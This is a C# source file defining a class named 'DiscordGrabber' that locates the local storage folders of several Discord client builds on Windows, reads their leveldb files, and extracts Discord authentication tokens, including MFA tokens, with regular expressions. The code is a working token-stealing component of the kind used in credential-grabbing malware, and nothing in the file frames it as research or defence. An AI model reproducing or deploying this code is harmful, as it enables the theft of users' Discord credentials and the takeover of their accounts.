using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;


public static class DiscordGrabber
{

    internal readonly static DirectoryInfo[] RootFolders =
    {
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discorddevelopment\Local Storage\leveldb"),
    };

    public static List<string> GetTokens()
    {
        List<string> tokens = new List<string>();


        foreach (DirectoryInfo rootFolder in RootFolders) // Foreach discord 'leveldb' folder:
        {
            if (!rootFolder.Exists) break; // If folder doesn't exist: break
            foreach (FileInfo file in rootFolder.GetFiles("*.ldb")) // Foreach .ldb file in 'leveldb':
            {
                string content = file.OpenText().ReadToEnd(); // Read file

                // Match tokens:
                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

                foreach (Match match in Regex.Matches(content, @"mfa\.[\w-]{84}"))
                    tokens.Add(match.Value);
            }
        }

        return tokens.Distinct().ToList();
    }
}